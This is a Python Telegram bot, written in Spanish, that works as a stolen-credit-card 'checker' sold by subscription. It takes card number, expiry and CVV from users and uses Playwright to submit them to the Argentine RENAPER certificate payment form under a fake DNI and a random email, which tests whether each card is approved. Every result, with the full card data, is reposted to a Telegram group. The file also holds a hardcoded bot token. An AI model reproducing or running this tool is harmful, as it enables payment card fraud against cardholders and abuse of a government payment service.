import asyncio
import random
import string
import json
from collections import deque
from telebot.async_telebot import AsyncTeleBot
from playwright.async_api import async_playwright

bot_token = "7591727242:AAEIqlas3SJRjteHQGr-UkxaoJDZMOaScLU"
GROUP_ID = "-1002168776336"
bot = AsyncTeleBot(bot_token)
queue = deque()
usuarios_autorizados = {"1658470522"}

def cargar_usuarios():
    try:
        with open("usuarios.json", "r") as file:
            return set(json.load(file))
    except (FileNotFoundError, json.JSONDecodeError):
        return set()

def guardar_usuarios():
    with open("usuarios.json", "w") as file:
        json.dump(list(usuarios_autorizados), file)

async def completar_formulario(binlargo, mes, anio, code):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        await page.goto("https://tramites.renaper.gob.ar/v2/MACRO_genera.php?tipo_tramite=CERTSOLTERIA")
        email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}@{''.join(random.choices(string.ascii_lowercase, k=5))}.com"
        await page.fill("#dni", "44444444")
        await page.select_option("#sexo", "F")
        await page.fill("#email", email)
        await page.click("button.btn.btn-info:text('Continuar')")
        await page.wait_for_timeout(2000)
        await page.click("a.btn.btn-info:text('CONTINUAR')")
        await page.wait_for_timeout(2000)
        await page.click("input#MainContent_btnTarjeta")
        await page.wait_for_timeout(2000)
        if binlargo.startswith("4"):
            await page.select_option("#ddlTarjeta", "1")
        elif binlargo.startswith("5"):
            await page.select_option("#ddlTarjeta", "104")
        await page.fill("#txtCardNumber", binlargo)
        await page.fill("#txtCardExpirationMonth", mes)
        await page.fill("#txtCardExpirationYear", anio)
        await page.fill("#txtSecurityCode", code)
        await page.click("input#MainContent_btnGenerarTarjeta")
        await page.wait_for_timeout(2000)
        error_text = await page.text_content("body")
        await browser.close()
        return "aprobada" in error_text.lower()

async def process_queue():
    while True:
        if queue:
            user_message = queue.popleft()
            tarjeta, mes, anio, codigo = user_message['tarjeta'], user_message['mes'], user_message['anio'], user_message['codigo']
            message = user_message['message']
            username = user_message['username']
            result = await completar_formulario(tarjeta, mes, anio, codigo)
            if result:
                formatted_response = (
                    "Checkeo de CC | Exitoso\n"
                    "✅ Tarjeta aprobada!\n\n"
                    "-----\n"
                    f"Número de Tarjeta: {tarjeta}\n"
                    f"MM|AA: {mes}|{anio}\n"
                    f"CVV: {codigo}\n"
                    "-----\n"
                    f"Usuario: @{username}\n"
                    "Monto: 2000 ARS"
                )
            else:
                formatted_response = (
                    "Checkeo de CC | Fallido\n"
                    "❌ Tarjeta rechazada!\n\n"
                    "-----\n"
                    f"Número de Tarjeta: {tarjeta}\n"
                    f"MM|AA: {mes}|{anio}\n"
                    f"CVV: {codigo}\n"
                    "-----\n"
                    f"Usuario: @{username}\n"
                )
            await bot.reply_to(message, formatted_response)
            await bot.send_message(GROUP_ID, formatted_response)
        else:
            await asyncio.sleep(1)

@bot.message_handler(commands=["start"])
async def start(message):
    await bot.reply_to(message, "Hola, Gracias por usar nuestro bot, estos son nuestros comandos:\n"
                       "/check CC|MM|AA|CVV\n"
                       "/usuarios add/remove <user_id>\n"
                       "Soy un bot de checkeo, mi funcion es checkear CC para facilitarte el proceso a vos"
                       )

@bot.message_handler(commands=["usuarios"])
async def manejar_usuarios(message):
    args = message.text.split()
    if len(args) != 3:
        await bot.reply_to(message, "Uso: /usuarios add|remove <user_id>")
        return
    accion, user_id = args[1], args[2]
    if accion == "add":
        usuarios_autorizados.add(user_id)
        guardar_usuarios()
        await bot.reply_to(message, f"Usuario {user_id} añadido.")
    elif accion == "remove":
        usuarios_autorizados.discard(user_id)
        guardar_usuarios()
        await bot.reply_to(message, f"Usuario {user_id} eliminado.")
    else:
        await bot.reply_to(message, "Acción inválida. Usa add o remove.")

@bot.message_handler(commands=["check"])
async def check(message):
    if str(message.from_user.id) not in usuarios_autorizados:
        await bot.reply_to(message, "No tienes acceso. Contacta a @cardea2 para comprar una suscripción.")
        return
    args = message.text.split()
    if len(args) != 2:
        await bot.reply_to(message, "Uso: /check CC|MM|AA|CVV")
        return
    datos = args[1].split("|")
    if len(datos) != 4:
        await bot.reply_to(message, "Formato inválido. Uso: /check CC|MM|AA|CVV")
        return
    tarjeta, mes, anio, codigo = datos
    queue.append({"tarjeta": tarjeta, "mes": mes, "anio": anio, "codigo": codigo, "message": message, "username": message.from_user.username})
    await bot.reply_to(message, "Tu tarjeta está siendo procesada.")

async def main():
    global usuarios_autorizados
    usuarios_autorizados = cargar_usuarios()
    asyncio.create_task(process_queue())
    await bot.infinity_polling()

if __name__ == "__main__":
    asyncio.run(main())
